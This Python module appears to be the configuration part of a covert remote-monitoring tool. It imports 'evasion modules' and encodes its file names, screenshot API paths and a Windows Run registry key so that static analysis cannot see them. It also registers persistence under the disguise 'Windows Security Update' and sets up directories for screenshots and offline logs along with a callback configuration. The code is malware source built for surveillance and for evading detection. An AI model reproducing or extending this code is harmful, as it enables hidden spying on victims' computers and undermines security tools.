"""
Configuration Management - With String Obfuscation
Demonstrates how to hide sensitive strings from static analysis
"""
import json
import os
import secrets
from pathlib import Path

# Import obfuscation utilities
from evasion_modules.obfuscation import (
    obfuscate_string, deobfuscate_string,
    build_stack_string, string_to_stack_format
)

# =============================================================================
# OBFUSCATED STRINGS - Hidden from static analysis
# =============================================================================

# These strings are pre-obfuscated and will be decoded at runtime
# A real implementation would generate these at build time

OBFUSCATED_STRINGS = {
    # File names
    'config_file': 'eJyrVspIzcnJVyguSUxOTVGyUkpJLElUslJKLE7NKylWKErNKQGxFYBsAykbqBoA5xETpQ==',
    'callback_file': 'eJyrVspIzcnJVyguSUxOTVGyUkpKzMksLiktSgGyFYBsAykbqBoAeisT2A==',
    
    # Directory names (use stack strings for extra obfuscation)
    'monitor_data': [109, 111, 110, 105, 116, 111, 114, 95, 100, 97, 116, 97],
    'screenshots': [115, 99, 114, 101, 101, 110, 115, 104, 111, 116, 115],
    'offline_logs': [111, 102, 102, 108, 105, 110, 101, 95, 108, 111, 103, 115],
    
    # API endpoint paths
    'api_status': 'eJyrVsosS8wtyEksSVSyUsovSizJzM9TslJKLCkJyUxOBQBYywyD',
    'api_events': 'eJyrVsosS8wtyEksSVSyUsovSizJzM9TslIqKSpNBQA+TgyG',
    'api_screenshot': 'eJyrVsosS8wtyEksSVSyUsovSizJzM9TslLKzCtJzStRAgAzgQ0z',
    
    # Registry keys
    'reg_run_key': 'eJyrVkrJLC4pysxLV7JSKi5ITc7PKU3MqUwtSk0sSgHyMvNKUouLQRIpqcUlmfl5SlZKVgpW+ZUlFUAhADctGVc=',
    'reg_value_name': 'eJyrVspIzcnJVyguSUxOTVGy4gIpKeQV5ScqWSlZAQAXXQ9/',
}

def get_obfuscated_string(key: str, use_stack_string: bool = False) -> str:
    """
    Retrieve and decode an obfuscated string
    
    Args:
        key: Key name from OBFUSCATED_STRINGS
        use_stack_string: If True, treat as stack string array
    
    Returns:
        Decoded string
    """
    if key not in OBFUSCATED_STRINGS:
        return None
    
    if use_stack_string:
        # Build from character codes
        return build_stack_string(OBFUSCATED_STRINGS[key])
    else:
        # Decode base64 + compressed string
        return deobfuscate_string(OBFUSCATED_STRINGS[key])


# =============================================================================
# BUILD-TIME STRING ENCODING (for demonstration)
# =============================================================================

def encode_strings_for_production():
    """
    This function shows how to generate the obfuscated strings above
    Run this once to generate encoded strings, then paste them into OBFUSCATED_STRINGS
    """
    strings_to_encode = {
        'config_file': 'config.json',
        'callback_file': 'callback_config.json',
        'api_status': '/api/status',
        'api_events': '/api/events',
        'api_screenshot': '/api/screenshot',
        'reg_run_key': r'Software\Microsoft\Windows\CurrentVersion\Run',
        'reg_value_name': 'Windows Security Update',
    }
    
    print("# Paste these into OBFUSCATED_STRINGS:")
    print("OBFUSCATED_STRINGS = {")
    for key, value in strings_to_encode.items():
        encoded = obfuscate_string(value)
        print(f"    '{key}': '{encoded}',")
    
    # Stack strings
    stack_strings = {
        'monitor_data': 'monitor_data',
        'screenshots': 'screenshots',
        'offline_logs': 'offline_logs',
    }
    
    for key, value in stack_strings.items():
        codes = string_to_stack_format(value)
        print(f"    '{key}': {codes},")
    
    print("}")


# =============================================================================
# CONFIGURATION WITH OBFUSCATION
# =============================================================================

# Decode file names at runtime
CONFIG_FILE = get_obfuscated_string('config_file')
CALLBACK_CONFIG_FILE = get_obfuscated_string('callback_file')

# Build directory names from stack strings
DATA_DIR = Path(get_obfuscated_string('monitor_data', use_stack_string=True))
SCREENSHOTS_DIR = DATA_DIR / get_obfuscated_string('screenshots', use_stack_string=True)
OFFLINE_LOGS_DIR = DATA_DIR / get_obfuscated_string('offline_logs', use_stack_string=True)


def ensure_directories():
    """Create necessary directories"""
    DATA_DIR.mkdir(exist_ok=True)
    SCREENSHOTS_DIR.mkdir(exist_ok=True)
    OFFLINE_LOGS_DIR.mkdir(exist_ok=True)


def load_config():
    """Load configuration from file"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    
    # Generate default config
    # Note: In production, these strings would also be obfuscated
    config = {
        "api_key": secrets.token_urlsafe(32),
        "port": 5000,
        "host": "0.0.0.0",
        "auto_screenshot": False,
        "screenshot_interval": 300,
        "motion_detection": False,
        "data_retention_days": 30,
        "pc_id": secrets.token_hex(8),
        "pc_name": os.environ.get('COMPUTERNAME', 'Unknown-PC')
    }
    
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    
    print(f"\n{'='*70}")
    print("FIRST TIME SETUP - Configuration Created")
    print(f"{'='*70}")
    print(f"API Key: {config['api_key']}")
    print(f"Port: {config['port']}")
    print(f"\nSave this API key - you'll need it in the client!")
    print(f"{'='*70}\n")
    
    return config


def load_callback_config():
    """Load callback configuration"""
    if os.path.exists(CALLBACK_CONFIG_FILE):
        try:
            with open(CALLBACK_CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    
    default_config = {
        "enabled": False,
        "callback_url": "http://YOUR_CLIENT_IP:8080",
        "callback_key": "COPY_FROM_CLIENT",
        "interval": 15,
        "heartbeat_interval": 5,
        "retry_interval": 10
    }
    
    with open(CALLBACK_CONFIG_FILE, 'w') as f:
        json.dump(default_config, f, indent=4)
    
    return default_config


# =============================================================================
# DEMONSTRATION MODE - Show what's obfuscated
# =============================================================================

def print_obfuscation_demo():
    """Show obfuscated strings in demo mode"""
    print("\n" + "="*70)
    print("STRING OBFUSCATION DEMONSTRATION")
    print("="*70)
    print("\nObfuscated strings in use:")
    print(f"  Config file: '{CONFIG_FILE}' (decoded from: {OBFUSCATED_STRINGS['config_file'][:30]}...)")
    print(f"  Data dir: '{DATA_DIR}' (built from character codes)")
    print(f"  Screenshots: '{SCREENSHOTS_DIR}' (built from character codes)")
    print(f"\nIn the compiled binary, these strings are NOT visible in plain text!")
    print("Static analysis tools will see compressed/encoded data instead.")
    print("="*70 + "\n")


# Initialize directories
ensure_directories()

# Load configuration
config = load_config()
pc_id = config['pc_id']
API_KEY = config['api_key']

# Show demo in development mode (comment out for production)
if __name__ == "__main__":
    print_obfuscation_demo()